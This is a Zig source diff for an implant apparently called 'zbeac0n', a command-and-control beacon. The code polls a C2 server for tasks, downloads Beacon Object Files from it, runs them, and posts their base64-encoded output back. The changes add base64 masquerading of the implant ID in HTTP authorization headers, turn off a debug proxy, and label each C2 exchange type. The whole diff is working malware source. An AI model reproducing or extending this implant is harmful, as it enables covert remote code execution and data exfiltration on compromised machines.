@@ -29,7 +29,7 @@ pub const std_options = std.Options{
     .http_disable_tls = true,
     .log_level = .info,
 };
-const debug_proxy_enabled = true;
+const debug_proxy_enabled = false;
 const debug_proxy_host = "127.0.0.1";
 const debug_proxy_port = 8080;
 
@@ -143,10 +143,10 @@ fn netExchange(
         else => return null,
     };
 
-
     if (res != null) {
         return @ptrCast(res.?.ptr);
     }
+
     return null;
 }
 
@@ -174,7 +174,7 @@ fn netHttpExchange(
         .connection = conn,
     };
 
-    // query C2 for new tasks
+    // query C2 for new tasks (GET_TASK)
     if (connectionType == .Heartbeat) {
         http_method = .GET;
         const url = try std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint });
@@ -183,7 +183,7 @@ fn netHttpExchange(
         // apply HTTP header transforms
         _ = s.implant_actions.netMasquerade(s, connectionType, &http_reqOptions, null, len);
 
-    // fetching for a resource as indicated in 'extra_data'
+    // fetching for a resource as indicated in 'extra_data' (GET_RESOURCE)
     } else if (connectionType == .ResourceFetch and extra_data != null) {
 
         // in case of ResourceFetch exchange extra_data is a  0-terminated path to the resource
@@ -198,7 +198,7 @@ fn netHttpExchange(
         // apply HTTP header transforms
         _ = s.implant_actions.netMasquerade(s, connectionType, &http_reqOptions, null, len);
 
-    // returning results of an already completed task
+    // returning results of an already completed task (POST_RESULT)
     } else if (connectionType == .TaskResult and extra_data != null) {
         // in case of TaskResult exchange extra_data is a length len.*
 
@@ -285,22 +285,35 @@ fn netHttpMasquerade(s: *zbeac0n.State, connectionType: zbeac0n.netConnectionTyp
     //
     // Implement transforms based on type of the current connection
     //
-    if (connectionType == zbeac0n.netConnectionType.Heartbeat) {
+    
+    const b64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
 
-        // header transforms: implantID -> HTTP authorization header
+    if (connectionType == zbeac0n.netConnectionType.Heartbeat) {
+        //
+        // header transforms: base64(implantID) -> HTTP authorization header
+        //
+
+        const implant_identity_b64 = try s.allocator.alloc(u8, b64_encoder.calcSize(s.implant_identity.len));
+        _ = std.base64.Base64Encoder.encode(&b64_encoder, implant_identity_b64, s.implant_identity);
+
         http_reqOptions.headers.authorization = std.http.Client.Request.Headers.Value{
-            .override = s.implant_identity,
+            .override = implant_identity_b64,
         };
     } else if (connectionType == zbeac0n.netConnectionType.ResourceFetch) {
-
-        // header transforms: implantID -> HTTP authorization header
+        //
+        // header transforms: base64(implantID) -> HTTP authorization header
+        //
+        const implant_identity_b64 = try s.allocator.alloc(u8, b64_encoder.calcSize(s.implant_identity.len));
+        _ = std.base64.Base64Encoder.encode(&b64_encoder, implant_identity_b64, s.implant_identity);
+        
         http_reqOptions.headers.authorization = std.http.Client.Request.Headers.Value{
-            .override = s.implant_identity,
+            .override = implant_identity_b64,
         };
     } else if (connectionType == zbeac0n.netConnectionType.TaskResult) {
 
-        // sth is wrong: nothing to mask
         const bof_res: ?*zbeac0n.BofRes = @ptrCast(@alignCast(data_to_mask));
+
+        // sth is wrong: nothing to mask
         if (bof_res == null) return null;
 
         // header transforms: taskID -> HTTP authorization header
@@ -321,12 +334,12 @@ fn netHttpMasquerade(s: *zbeac0n.State, connectionType: zbeac0n.netConnectionTyp
 
         // data / body transforms: base64(body)
         if (bof_res.?.output != null) {
-            const new_body_len = s.base64_encoder.calcSize(bof_res.?.len);
+            const new_body_len = b64_encoder.calcSize(bof_res.?.len);
             const out_b64 = try s.allocator.alloc(u8, new_body_len);
             errdefer s.allocator.free(out_b64);
 
             const body = @as([*]u8, @ptrCast(@constCast(bof_res.?.output)))[0..bof_res.?.len];
-            _ = s.base64_encoder.encode(out_b64, body);
+            _ = b64_encoder.encode(out_b64, body);
 
             std.log.info("Bof launcher output (base64): {s}", .{out_b64});
 
@@ -379,11 +392,12 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *zbeac0n.State, task
     const bof_argv_b64 = task_fields[4];
 
     std.log.info("bof_argv_b64: {s}", .{bof_argv_b64});
+    const b64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
 
-    const len = try state.base64_decoder.calcSizeForSlice(bof_argv_b64);
+    const len = try b64_decoder.calcSizeForSlice(bof_argv_b64);
     const bof_argv = try allocator.alloc(u8, len);
     defer allocator.free(bof_argv);
-    _ = try state.base64_decoder.decode(bof_argv, bof_argv_b64);
+    _ = try b64_decoder.decode(bof_argv, bof_argv_b64);
 
     // process BOF header { exec_mode:args_spec{iszZb}:bofHash:[persist] }
     var bof_header_iter = std.mem.splitScalar(u8, bof_header, ':');
@@ -417,7 +431,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *zbeac0n.State, task
             _ = state.persistent_bofs.remove(hash);
         }
 
-        // else: we need to fetch BOF file content from C2 sever
+        // else: we need to fetch BOF file content from C2 sever (GET_RESOURCE)
     } else {
         std.log.info("fetching BOF", .{});
         const net_conn = state.implant_actions.netConnect(state, zbeac0n.netConnectionType.ResourceFetch, null);
@@ -656,6 +670,8 @@ fn processCommands(allocator: std.mem.Allocator, state: *zbeac0n.State, resp_con
 
 fn processPendingBofs(allocator: std.mem.Allocator, state: *zbeac0n.State) !void {
     var pending_bof_index: usize = 0;
+
+    // iterate thru all BOFs that are currently in 'state.pending_bofs' list
     while (pending_bof_index != state.pending_bofs.items.len) {
         const pending_bof = state.pending_bofs.items[pending_bof_index];
 
@@ -705,7 +721,7 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *zbeac0n.State) !void
         }
 
         //
-        // Sending results (status code & output) to C2 server
+        // Sending results (status code & output) to C2 server (POST_RESULT)
         //
         std.log.info("BOF status code: {d}", .{bof_res.status_code});
         if (bof_res.len > 0) {
@@ -735,6 +751,7 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
 
+    // attach default (i.e. builtin) C2 communication implementation
     const implant_actions: zbeac0n.ImplantActions = .{
         .netInit = netInit,
         .netConnect = netConnect,
@@ -756,7 +773,7 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
 
         if (net_conn) |conn| {
 
-            // query C2 server for new tasks
+            // query C2 server for new tasks (GET_TASK)
             var body_len: u32 = 0;
             const resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netExchange(&state, zbeac0n.netConnectionType.Heartbeat, conn, &body_len, null));
 
